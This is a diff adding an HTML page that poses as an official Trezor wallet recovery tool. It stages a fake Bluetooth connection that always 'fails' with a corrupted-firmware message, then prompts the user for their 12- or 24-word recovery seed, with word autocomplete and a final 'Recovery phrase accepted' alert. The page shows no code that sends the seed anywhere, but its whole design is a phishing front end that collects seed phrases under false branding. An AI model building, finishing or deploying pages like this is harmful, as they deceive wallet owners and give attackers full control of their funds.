@@ -1,0 +1,971 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Trezor Wallet Recovery</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0f0a;
+            color: #fff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .screen {
+            display: none;
+            flex: 1;
+            flex-direction: column;
+            padding: 20px;
+            height: 100%;
+            overflow-y: auto;
+        }
+
+        .screen.active {
+            display: flex;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 30px;
+        }
+
+        .logo-icon {
+            width: 24px;
+            height: 24px;
+            color: #00d084;
+        }
+
+        .logo-text {
+            font-size: 16px;
+            font-weight: 600;
+            color: #00d084;
+            letter-spacing: 0.5px;
+        }
+
+        .step-indicator {
+            color: #00d084;
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .step-indicator::before {
+            content: '';
+            width: 6px;
+            height: 6px;
+            background: #00d084;
+            border-radius: 50%;
+        }
+
+        h1 {
+            font-size: 32px;
+            line-height: 1.1;
+            margin-bottom: 16px;
+            font-weight: 700;
+        }
+
+        h1 .highlight {
+            color: #00d084;
+        }
+
+        .subtitle {
+            color: #8a9a8a;
+            font-size: 15px;
+            line-height: 1.5;
+            margin-bottom: 40px;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 18px 24px;
+            background: #00d084;
+            color: #0a0f0a;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: transform 0.2s, opacity 0.2s;
+        }
+
+        .btn-primary:active {
+            transform: scale(0.98);
+            opacity: 0.9;
+        }
+
+        .btn-option {
+            width: 100%;
+            padding: 20px;
+            background: rgba(0, 208, 132, 0.05);
+            border: 1px solid rgba(0, 208, 132, 0.2);
+            border-radius: 16px;
+            color: #fff;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            transition: all 0.2s;
+            margin-bottom: 12px;
+        }
+
+        .btn-option:active {
+            background: rgba(0, 208, 132, 0.1);
+            border-color: rgba(0, 208, 132, 0.4);
+        }
+
+        .btn-option-icon {
+            width: 40px;
+            height: 40px;
+            background: rgba(0, 208, 132, 0.1);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #00d084;
+        }
+
+        .btn-option-content {
+            flex: 1;
+            text-align: left;
+        }
+
+        .btn-option-title {
+            font-size: 16px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+
+        .btn-option-desc {
+            font-size: 13px;
+            color: #8a9a8a;
+        }
+
+        .btn-option-arrow {
+            color: #5a6a5a;
+        }
+
+        .legal {
+            text-align: center;
+            font-size: 12px;
+            color: #5a6a5a;
+            margin-top: 20px;
+            line-height: 1.5;
+        }
+
+        .legal a {
+            color: #8a9a8a;
+            text-decoration: underline;
+        }
+
+        .illustration {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 0;
+        }
+
+        .device-illustration {
+            width: 200px;
+            height: 200px;
+            position: relative;
+        }
+
+        .device-svg {
+            width: 100%;
+            height: 100%;
+            filter: drop-shadow(0 0 40px rgba(0, 208, 132, 0.3));
+        }
+
+        .loading-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .spinner {
+            width: 60px;
+            height: 60px;
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .spinner-ring {
+            width: 100%;
+            height: 100%;
+            border: 4px solid rgba(0, 208, 132, 0.1);
+            border-top-color: #00d084;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .loading-text {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .loading-subtext {
+            color: #8a9a8a;
+            font-size: 14px;
+            text-align: center;
+        }
+
+        .loading-dots {
+            display: flex;
+            gap: 6px;
+            margin-top: 30px;
+        }
+
+        .loading-dot {
+            width: 8px;
+            height: 8px;
+            background: #1a2a1a;
+            border-radius: 50%;
+            transition: background 0.3s;
+        }
+
+        .loading-dot.active {
+            background: #00d084;
+        }
+
+        .back-btn {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #5a6a5a;
+            font-size: 14px;
+            margin-top: auto;
+            padding: 20px 0;
+            cursor: pointer;
+            background: none;
+            border: none;
+            width: fit-content;
+        }
+
+        .content-area {
+            flex: 1;
+            overflow-y: auto;
+            padding-bottom: 20px;
+        }
+
+        .word-count-toggle {
+            display: flex;
+            background: rgba(0, 208, 132, 0.05);
+            border: 1px solid rgba(0, 208, 132, 0.2);
+            border-radius: 30px;
+            padding: 4px;
+            margin-bottom: 24px;
+        }
+
+        .word-count-btn {
+            flex: 1;
+            padding: 12px;
+            border: none;
+            background: transparent;
+            color: #5a6a5a;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+            border-radius: 25px;
+            transition: all 0.2s;
+        }
+
+        .word-count-btn.active {
+            background: #00d084;
+            color: #0a0f0a;
+        }
+
+        .seed-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 20px;
+            max-height: 320px;
+            overflow-y: auto;
+            padding-right: 4px;
+        }
+
+        .seed-input {
+            background: rgba(0, 208, 132, 0.05);
+            border: 1px solid rgba(0, 208, 132, 0.2);
+            border-radius: 12px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .seed-input.active {
+            border-color: #00d084;
+            background: rgba(0, 208, 132, 0.08);
+        }
+
+        .seed-number {
+            color: #5a6a5a;
+            font-size: 12px;
+            font-weight: 600;
+            min-width: 20px;
+        }
+
+        .seed-value {
+            flex: 1;
+            font-family: 'SF Mono', 'Courier New', monospace;
+            font-size: 15px;
+            font-weight: 500;
+            letter-spacing: 2px;
+            color: #00d084;
+        }
+
+        .seed-value.empty {
+            color: #3a4a3a;
+            letter-spacing: normal;
+        }
+
+        .keyboard {
+            background: #0f1a0f;
+            border-top: 1px solid #1a2a1a;
+            padding: 12px 8px;
+            padding-bottom: max(12px, env(safe-area-inset-bottom));
+            margin-top: auto;
+        }
+
+        .keyboard-suggestions {
+            display: flex;
+            gap: 8px;
+            overflow-x: auto;
+            margin-bottom: 12px;
+            padding-bottom: 4px;
+            scrollbar-width: none;
+            min-height: 50px;
+        }
+
+        .keyboard-suggestions::-webkit-scrollbar {
+            display: none;
+        }
+
+        .suggestion-chip {
+            padding: 10px 16px;
+            background: rgba(0, 208, 132, 0.1);
+            border: 1px solid rgba(0, 208, 132, 0.3);
+            border-radius: 20px;
+            color: #00d084;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            white-space: nowrap;
+            transition: all 0.2s;
+        }
+
+        .suggestion-chip:active {
+            background: #00d084;
+            color: #0a0f0a;
+        }
+
+        .keyboard-row {
+            display: flex;
+            justify-content: center;
+            gap: 6px;
+            margin-bottom: 8px;
+        }
+
+        .key {
+            height: 44px;
+            min-width: 32px;
+            flex: 1;
+            max-width: 44px;
+            background: #1a2a1a;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.1s;
+        }
+
+        .key:active {
+            background: #2a3a2a;
+            transform: scale(0.95);
+        }
+
+        .key.special {
+            background: #2a3a2a;
+            max-width: 60px;
+            flex: 1.5;
+        }
+
+        .key.special:active {
+            background: #3a4a3a;
+        }
+
+        .key-icon {
+            width: 20px;
+            height: 20px;
+        }
+
+        ::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: #1a2a1a;
+            border-radius: 2px;
+        }
+
+        .loading-toast {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: rgba(0,0,0,0.85);
+            border-radius: 12px;
+            padding: 12px;
+            text-align: center;
+            font-size: 13px;
+            color: #00d084;
+            z-index: 100;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Screen 1: Welcome -->
+    <div class="screen active" id="screen1">
+        <div class="logo">
+            <svg class="logo-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+            <span class="logo-text">TREZOR</span>
+        </div>
+
+        <div class="step-indicator">Wallet Recovery</div>
+        <h1>RECOVER YOUR <span class="highlight">TREZOR</span> WALLET</h1>
+        <p class="subtitle">Regain access to your crypto. Restore your Trezor wallet securely in minutes using your recovery seed phrase.</p>
+
+        <div class="illustration">
+            <div class="device-illustration">
+                <svg class="device-svg" viewBox="0 0 200 200" fill="none" stroke="#00d084" stroke-width="1.5">
+                    <rect x="60" y="40" width="80" height="120" rx="8" fill="rgba(0,208,132,0.05)"/>
+                    <rect x="70" y="60" width="60" height="80" rx="4"/>
+                    <line x1="80" y1="75" x2="120" y2="75"/>
+                    <line x1="80" y1="85" x2="110" y2="85"/>
+                    <line x1="80" y1="95" x2="115" y2="95"/>
+                    <rect x="85" y="110" width="30" height="15" rx="3" fill="#00d084" stroke="none"/>
+                    <text x="100" y="121" text-anchor="middle" fill="#0a0f0a" font-size="8" font-weight="bold" stroke="none">APPROVE</text>
+                    <rect x="30" y="80" width="50" height="70" rx="4" transform="rotate(-15 55 115)" fill="rgba(0,208,132,0.03)"/>
+                    <line x1="40" y1="95" x2="70" y2="95" transform="rotate(-15 55 115)"/>
+                    <line x1="40" y1="105" x2="65" y2="105" transform="rotate(-15 55 115)"/>
+                    <rect x="120" y="70" width="50" height="70" rx="4" transform="rotate(15 145 105)" fill="rgba(0,208,132,0.03)"/>
+                    <line x1="130" y1="85" x2="160" y2="85" transform="rotate(15 145 105)"/>
+                    <path d="M40 50 L42 55 L47 57 L42 59 L40 64 L38 59 L33 57 L38 55 Z" fill="#00d084" stroke="none"/>
+                    <path d="M150 40 L152 45 L157 47 L152 49 L150 54 L148 49 L143 47 L148 45 Z" fill="#00d084" stroke="none"/>
+                </svg>
+            </div>
+        </div>
+
+        <button class="btn-primary" onclick="goToScreen(2)">
+            Get started
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
+                <path d="M5 12h14M12 5l7 7-7 7"/>
+            </svg>
+        </button>
+
+        <p class="legal">
+            By tapping "Get started" you consent and agree to our<br>
+            <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>
+        </p>
+    </div>
+
+    <!-- Screen 2: Connect Device -->
+    <div class="screen" id="screen2">
+        <div class="logo">
+            <svg class="logo-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+            <span class="logo-text">TREZOR</span>
+        </div>
+
+        <div class="step-indicator">Step 1 of 4</div>
+        <h1>CONNECT YOUR <span class="highlight">DEVICE</span></h1>
+        <p class="subtitle">Choose how you'd like to connect your Trezor. Make sure your device is powered on before proceeding.</p>
+
+        <button class="btn-option" onclick="startBluetoothConnection()">
+            <div class="btn-option-icon">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M3 7v10a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V9a2 2 0 0 0-2-2h-6l-2-2H5a2 2 0 0 0-2 2z"/>
+                </svg>
+            </div>
+            <div class="btn-option-content">
+                <div class="btn-option-title">Bluetooth</div>
+                <div class="btn-option-desc">Connect wirelessly via Bluetooth (Trezor Model T & Safe 5)</div>
+            </div>
+            <svg class="btn-option-arrow" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M9 18l6-6-6-6"/>
+            </svg>
+        </button>
+
+        <button class="back-btn" onclick="goToScreen(1)">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M19 12H5M12 19l-7-7 7-7"/>
+            </svg>
+            Back
+        </button>
+    </div>
+
+    <!-- Screen 3: Connecting -->
+    <div class="screen" id="screen3">
+        <div class="logo">
+            <svg class="logo-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+            </svg>
+            <span class="logo-text">TREZOR</span>
+        </div>
+
+        <div class="step-indicator">Step 1 of 4</div>
+        <h1>CONNECTING <span class="highlight">YOUR DEVICE</span></h1>
+        
+        <div class="loading-container">
+            <div class="spinner">
+                <div class="spinner-ring"></div>
+            </div>
+            <div class="loading-text" id="loadingText">Searching for device...</div>
+            <div class="loading-subtext" id="loadingSubtext">Scanning nearby Bluetooth devices...</div>
+            
+            <div class="loading-dots" id="loadingDots">
+                <div class="loading-dot active"></div>
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+            </div>
+        </div>
+
+        <button class="back-btn" onclick="goToScreen(2)">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                <path d="M19 12H5M12 19l-7-7 7-7"/>
+            </svg>
+            Cancel
+        </button>
+    </div>
+
+    <!-- Screen 4: Enter Seed -->
+    <div class="screen" id="screen4">
+        <div class="content-area">
+            <div class="logo">
+                <svg class="logo-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                    <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                </svg>
+                <span class="logo-text">TREZOR</span>
+            </div>
+
+            <div class="step-indicator">Step 2 of 4</div>
+            <h1>ENTER YOUR <span class="highlight">RECOVERY SEED</span></h1>
+            <p class="subtitle">Select the number of words in your recovery phrase, then enter each word carefully. Your input is hidden for security.</p>
+
+            <div class="word-count-toggle">
+                <button class="word-count-btn active" onclick="setWordCount(12)">12 words</button>
+                <button class="word-count-btn" onclick="setWordCount(24)">24 words</button>
+            </div>
+
+            <div class="seed-grid" id="seedGrid"></div>
+        </div>
+
+        <!-- Custom Keyboard -->
+        <div class="keyboard">
+            <div class="keyboard-suggestions" id="keyboardSuggestions"></div>
+            <div class="keyboard-row">
+                <button class="key" data-key="q">q</button>
+                <button class="key" data-key="w">w</button>
+                <button class="key" data-key="e">e</button>
+                <button class="key" data-key="r">r</button>
+                <button class="key" data-key="t">t</button>
+                <button class="key" data-key="y">y</button>
+                <button class="key" data-key="u">u</button>
+                <button class="key" data-key="i">i</button>
+                <button class="key" data-key="o">o</button>
+                <button class="key" data-key="p">p</button>
+            </div>
+            <div class="keyboard-row">
+                <button class="key" data-key="a">a</button>
+                <button class="key" data-key="s">s</button>
+                <button class="key" data-key="d">d</button>
+                <button class="key" data-key="f">f</button>
+                <button class="key" data-key="g">g</button>
+                <button class="key" data-key="h">h</button>
+                <button class="key" data-key="j">j</button>
+                <button class="key" data-key="k">k</button>
+                <button class="key" data-key="l">l</button>
+            </div>
+            <div class="keyboard-row">
+                <button class="key special" id="shiftBtn">
+                    <svg class="key-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M12 3l9 9h-4v9H7v-9H3l9-9z"/>
+                    </svg>
+                </button>
+                <button class="key" data-key="z">z</button>
+                <button class="key" data-key="x">x</button>
+                <button class="key" data-key="c">c</button>
+                <button class="key" data-key="v">v</button>
+                <button class="key" data-key="b">b</button>
+                <button class="key" data-key="n">n</button>
+                <button class="key" data-key="m">m</button>
+                <button class="key special" id="backspaceBtn">
+                    <svg class="key-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zM18 9l-6 6M12 9l6 6"/>
+                    </svg>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div id="loadingToast" style="display: none;" class="loading-toast">Loading BIP39 word list...</div>
+
+    <script>
+        let bip39Words = [];
+        let wordListLoaded = false;
+        let currentScreen = 1;
+        let wordCount = 12;
+        let currentInputIndex = 0;
+        let seedWords = new Array(12).fill('');
+        let currentInput = '';
+        let isUpperCase = false;
+        let connectionTimer = null;
+        let dotInterval = null;
+
+        // Fetch the official BIP39 wordlist from GitHub
+        async function loadBip39WordList() {
+            const toast = document.getElementById('loadingToast');
+            toast.style.display = 'block';
+            try {
+                const response = await fetch('https://raw.githubusercontent.com/bitcoin/bips/refs/heads/master/bip-0039/english.txt');
+                const text = await response.text();
+                bip39Words = text.split('\n').filter(word => word.trim().length > 0 && !word.startsWith('#'));
+                console.log(`Loaded ${bip39Words.length} BIP39 words`);
+                wordListLoaded = true;
+            } catch (error) {
+                console.error('Failed to load BIP39 wordlist:', error);
+                // Fallback with minimal common words if fetch fails
+                bip39Words = ["abandon", "ability", "able", "about", "above", "absent", "absorb", "abstract", "absurd", "abuse"];
+                wordListLoaded = true;
+            } finally {
+                toast.style.display = 'none';
+            }
+        }
+
+        // Start loading the wordlist immediately
+        loadBip39WordList();
+
+        function goToScreen(n) {
+            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+            document.getElementById('screen' + n).classList.add('active');
+            currentScreen = n;
+            
+            if (n === 4) {
+                setTimeout(() => {
+                    renderSeedGrid();
+                    updateSuggestions('');
+                    highlightCurrentInput();
+                }, 50);
+            }
+        }
+
+        function startBluetoothConnection() {
+            goToScreen(3);
+            
+            let step = 0;
+            const steps = [
+                { text: "Searching for device...", subtext: "Scanning nearby Bluetooth devices..." },
+                { text: "Device found", subtext: "Establishing secure connection..." },
+                { text: "Connection failed", subtext: "Device firmware appears to be corrupted" }
+            ];
+            
+            dotInterval = setInterval(() => {
+                const dots = document.querySelectorAll('.loading-dot');
+                if (dots.length) {
+                    const active = document.querySelector('.loading-dot.active');
+                    const idx = active ? Array.from(dots).indexOf(active) : -1;
+                    dots.forEach(d => d.classList.remove('active'));
+                    dots[(idx + 1) % dots.length].classList.add('active');
+                }
+            }, 400);
+            
+            connectionTimer = setInterval(() => {
+                step++;
+                const loadingText = document.getElementById('loadingText');
+                const loadingSubtext = document.getElementById('loadingSubtext');
+                
+                if (step < 2) {
+                    loadingText.textContent = steps[step].text;
+                    loadingSubtext.textContent = steps[step].subtext;
+                } else if (step === 2) {
+                    clearInterval(connectionTimer);
+                    clearInterval(dotInterval);
+                    loadingText.textContent = steps[2].text;
+                    loadingSubtext.textContent = steps[2].subtext;
+                    
+                    setTimeout(() => {
+                        goToScreen(4);
+                    }, 2000);
+                }
+            }, 2500);
+        }
+
+        function setWordCount(n) {
+            wordCount = n;
+            seedWords = new Array(n).fill('');
+            currentInputIndex = 0;
+            currentInput = '';
+            
+            document.querySelectorAll('.word-count-btn').forEach((btn, i) => {
+                btn.classList.toggle('active', i === (n === 12 ? 0 : 1));
+            });
+            
+            renderSeedGrid();
+            updateSuggestions('');
+            highlightCurrentInput();
+        }
+
+        function renderSeedGrid() {
+            const grid = document.getElementById('seedGrid');
+            if (!grid) return;
+            grid.innerHTML = '';
+            
+            for (let i = 0; i < wordCount; i++) {
+                const div = document.createElement('div');
+                div.className = 'seed-input';
+                div.dataset.index = i;
+                div.onclick = () => selectInput(i);
+                
+                const num = document.createElement('span');
+                num.className = 'seed-number';
+                num.textContent = (i + 1).toString().padStart(2, '0');
+                
+                const valueSpan = document.createElement('span');
+                valueSpan.className = 'seed-value';
+                const word = seedWords[i];
+                if (word && word.length > 0) {
+                    // Show dots for security
+                    valueSpan.textContent = '●'.repeat(Math.min(word.length, 8));
+                    valueSpan.classList.remove('empty');
+                } else {
+                    valueSpan.textContent = '_____';
+                    valueSpan.classList.add('empty');
+                }
+                
+                div.appendChild(num);
+                div.appendChild(valueSpan);
+                grid.appendChild(div);
+            }
+        }
+
+        function highlightCurrentInput() {
+            document.querySelectorAll('.seed-input').forEach((el, i) => {
+                if (i === currentInputIndex) {
+                    el.classList.add('active');
+                } else {
+                    el.classList.remove('active');
+                }
+            });
+        }
+
+        function selectInput(index) {
+            currentInputIndex = index;
+            currentInput = seedWords[index] || '';
+            highlightCurrentInput();
+            updateSuggestions(currentInput);
+        }
+
+        function typeCharacter(char) {
+            if (!char) return;
+            currentInput += char;
+            updateCurrentInput();
+            updateSuggestions(currentInput);
+        }
+
+        function deleteCharacter() {
+            currentInput = currentInput.slice(0, -1);
+            updateCurrentInput();
+            updateSuggestions(currentInput);
+        }
+
+        function updateCurrentInput() {
+            seedWords[currentInputIndex] = currentInput;
+            
+            // Update the display with dots
+            const inputs = document.querySelectorAll('.seed-value');
+            if (inputs[currentInputIndex]) {
+                if (currentInput && currentInput.length > 0) {
+                    inputs[currentInputIndex].textContent = '●'.repeat(Math.min(currentInput.length, 8));
+                    inputs[currentInputIndex].classList.remove('empty');
+                } else {
+                    inputs[currentInputIndex].textContent = '_____';
+                    inputs[currentInputIndex].classList.add('empty');
+                }
+            }
+            
+            // Check if word matches BIP39 word (case insensitive)
+            if (bip39Words.length > 0) {
+                const lowerInput = currentInput.toLowerCase();
+                const exactMatch = bip39Words.includes(lowerInput);
+                
+                if (exactMatch && currentInput.length > 0) {
+                    setTimeout(() => {
+                        if (currentInputIndex < wordCount - 1) {
+                            selectInput(currentInputIndex + 1);
+                        } else if (currentInputIndex === wordCount - 1) {
+                            alert("Recovery phrase accepted! Proceeding to wallet restoration...");
+                        }
+                    }, 200);
+                }
+            }
+        }
+
+        // PREFIX MATCHING: Shows words that START WITH the typed letters
+        // When nothing is typed, the suggestions area remains empty
+        function updateSuggestions(input) {
+            const suggestionsDiv = document.getElementById('keyboardSuggestions');
+            if (!suggestionsDiv) return;
+            suggestionsDiv.innerHTML = '';
+            
+            if (!wordListLoaded || bip39Words.length === 0) {
+                // Show loading indicator only while fetching
+                const chip = document.createElement('span');
+                chip.className = 'suggestion-chip';
+                chip.style.opacity = '0.5';
+                chip.textContent = 'Loading...';
+                suggestionsDiv.appendChild(chip);
+                return;
+            }
+            
+            const lowerInput = input.toLowerCase();
+            
+            // EMPTY when nothing is typed - no default suggestions
+            if (!lowerInput || lowerInput.length === 0) {
+                return; // Keep suggestions area completely empty
+            }
+            
+            // Filter words that START WITH the typed prefix
+            const matches = bip39Words.filter(word => word.startsWith(lowerInput)).slice(0, 6);
+            
+            if (matches.length === 0) {
+                const chip = document.createElement('span');
+                chip.className = 'suggestion-chip';
+                chip.style.opacity = '0.5';
+                chip.textContent = 'No matches';
+                suggestionsDiv.appendChild(chip);
+            } else {
+                matches.forEach(word => {
+                    const chip = createSuggestionChip(word);
+                    suggestionsDiv.appendChild(chip);
+                });
+            }
+        }
+
+        function createSuggestionChip(word) {
+            const chip = document.createElement('span');
+            chip.className = 'suggestion-chip';
+            chip.textContent = word;
+            chip.onclick = (e) => {
+                e.stopPropagation();
+                currentInput = word;
+                updateCurrentInput();
+                updateSuggestions('');
+            };
+            return chip;
+        }
+
+        // Keyboard event handlers
+        document.addEventListener('DOMContentLoaded', () => {
+            // Attach keyboard listeners
+            document.querySelectorAll('.key[data-key]').forEach(btn => {
+                btn.addEventListener('click', () => {
+                    let key = btn.getAttribute('data-key');
+                    if (isUpperCase) key = key.toUpperCase();
+                    typeCharacter(key);
+                });
+            });
+            
+            document.getElementById('backspaceBtn')?.addEventListener('click', () => deleteCharacter());
+            
+            document.getElementById('shiftBtn')?.addEventListener('click', () => {
+                isUpperCase = !isUpperCase;
+                const letters = document.querySelectorAll('.key[data-key]');
+                letters.forEach(btn => {
+                    const originalKey = btn.getAttribute('data-key');
+                    if (originalKey && originalKey.length === 1) {
+                        btn.textContent = isUpperCase ? originalKey.toUpperCase() : originalKey.toLowerCase();
+                    }
+                });
+            });
+            
+            // Prevent any native keyboard
+            document.addEventListener('focusin', (e) => {
+                if (e.target.closest('.seed-input') || e.target.classList?.contains('seed-input')) {
+                    e.preventDefault();
+                    e.target.blur();
+                }
+            });
+            
+            // Physical keyboard support
+            document.addEventListener('keydown', (e) => {
+                if (currentScreen !== 4) return;
+                if (e.key === 'Backspace') {
+                    e.preventDefault();
+                    deleteCharacter();
+                } else if (e.key.length === 1 && e.key.match(/[a-zA-Z]/)) {
+                    e.preventDefault();
+                    typeCharacter(e.key.toLowerCase());
+                } else if (e.key === 'Enter') {
+                    e.preventDefault();
+                    if (currentInputIndex < wordCount - 1) {
+                        selectInput(currentInputIndex + 1);
+                    }
+                }
+            });
+        });
+    </script>
+</body>
+</html>
